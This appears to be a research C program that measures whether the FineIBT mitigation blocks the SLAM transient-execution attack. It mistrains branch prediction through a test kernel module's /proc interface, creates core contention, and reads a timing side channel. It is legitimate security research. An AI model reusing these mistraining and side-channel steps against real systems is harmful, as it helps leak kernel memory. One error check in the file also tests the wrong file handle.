/* Evaluation of FineIBT mitigation against SLAM.
 *
 * Date: November 23, 2023
 * Author: Mathé Hertogh - Vrije Universiteit Amsterdam
 */

#include "slam.h"

#define FINEIBT_RELOAD_BUF ((void *)0x9797000)
#define NR_TESTS 10000

FILE *fineibt_sid_file;
FILE *fineibt_gadget_file;

static void set_fineibt_sid(uint32_t sid)
{
	int len, count;
	char sid_buf[32];
	memset(sid_buf, 0, 32);
	len = snprintf(sid_buf, 32, "%x\n", sid);
	count = fwrite(sid_buf, 1, len, fineibt_sid_file);
	if (count != len)
		fail("set_fineibt_sid fwrite problem");
	fflush(fineibt_sid_file);
}

static void fineibt_gadget_trigger(int chain_len)
{
	int len, count;
	char chain_len_buf[20];
	memset(chain_len_buf, 0, 20);
	len = snprintf(chain_len_buf, 20, "%d\n", chain_len);
	count = fwrite(chain_len_buf, 1, len, fineibt_gadget_file);
	if (count != len)
		fail("trigger fineibt gadget fwrite problem");
	fflush(fineibt_gadget_file);
}

static void fineibt_init()
{
	fineibt_sid_file = fopen("/proc/kslam/fineibt_sid","w");
	if (!fineibt_sid_file)
		fail("can not open /proc/kslam/fineibt_sid");
	fineibt_gadget_file = fopen("/proc/kslam/fineibt_gadget","w");
	if (!fineibt_sid_file)
		fail("can not open /proc/kslam/fineibt_gadget");
}

__always_inline static void insert_branch_history()
{
	volatile char dummy;
	for (int r = 0; r < 23; r++)
		for (int s = 5; s < 16; s++)
			for (int t = 17; t > 1; t--)
				dummy = 0;
	asm volatile (
		".rept 0x20\n\t"
			"jmp 1f\n\t"
			"1:\n\t"
		".endr\n\t"
	);
}

__attribute__ ((noinline)) __attribute__((aligned(64))) static void contention_loop()
{
	asm volatile (
		"contention_start:\n\t"
			"mov %0, %%eax\n\t"
			"sub $0xcaca0, %%eax\n\t"
			"je contention_start\n\t"
		:
		: "r" ((uint32_t)0xcaca0)
		: "%eax"
	);
}

static void contention_main()
{
	if (prctl(PR_SET_PDEATHSIG, SIGTERM) == -1)
		fail("PR_SET_PDEATHSIG failed");

	set_cpu_affinity(get_sibling(CPU));

	pr_verbose("contention_loop start\n");
	contention_loop();
	pr_verbose("contention_loop end\n");

	exit(EXIT_SUCCESS);
}

static pid_t spawn_contention_thread()
{
	pid_t pid = fork();
	if (pid == 0)
		contention_main();
	return pid;
}

static int measure_signal(uint32_t sid, int chain_len)
{
	set_fineibt_sid(sid);
	insert_branch_history();
	signal_reset(0);
	fineibt_gadget_trigger(chain_len);
	return signal_raw_read(0) <= 23; // TODO hardcoded thres
}

static void experiment(int chain_len)
{
	int count;

	pr_info("FineIBT experiment with transient load chain of length %d.\n", chain_len);

	for (int i = 0; i < 2; i++) {
		uint32_t sid = i == 0 ? 0x0 : 0xcaca0;
		count = 0;
		for (int i = 0; i < NR_TESTS; i++) {
			count += measure_signal(sid, chain_len);
		}
		pr_result("FineIBT SID = %8x | %2d-deref-signal: %6.3f%%\n", sid, chain_len, 100.0*count/NR_TESTS);
	}

	count = 0;
	for (int i = 0; i < NR_TESTS; i++) {
		for (int j = 0; j < 10; j++)
			measure_signal(0xcaca0, chain_len);
		count += measure_signal(0x0, chain_len);
	}
	pr_result("FineIBT SID mistrained | %2d-deref-signal: %6.3f%%\n\n", chain_len, 100.0*count/NR_TESTS);
}

int main()
{
	set_cpu_affinity(CPU);
	init_rand();
	timer_init();
	evict_init();
	reload_init();
	reload_move_buf(FINEIBT_RELOAD_BUF);
	// gadget_init();
	fineibt_init();
	spawn_contention_thread();
	usleep(100000); // Let the contention thread spin up.

	for (int chain_len = 1; chain_len <= 10; chain_len++)
		experiment(chain_len);

	return 0;
}
